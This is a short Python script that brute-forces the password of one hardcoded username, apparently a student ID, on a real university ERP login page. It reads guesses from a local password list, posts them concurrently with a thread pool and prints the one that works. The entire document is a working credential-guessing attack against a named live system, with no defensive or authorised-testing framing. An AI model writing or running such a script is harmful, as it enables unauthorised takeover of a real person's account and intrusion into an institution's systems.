import concurrent.futures
import requests

url = 'https://erp.gctu.edu.gh/sip/auth/login.php'

def connect(passwd):
    username = 4231220076

    data ={
        "username":username,
        "password":passwd
    }
    r = requests.post(url, data=data)
    if r.text == 'ok':
        return f"correct password {passwd}"
    return f"wrong password {passwd}"


with open("pass.txt") as f:
       
    with concurrent.futures.ThreadPoolExecutor() as executor:
        pass_list = f.readlines()
        results = executor.map(connect, pass_list)

        for result in results:
            print(result)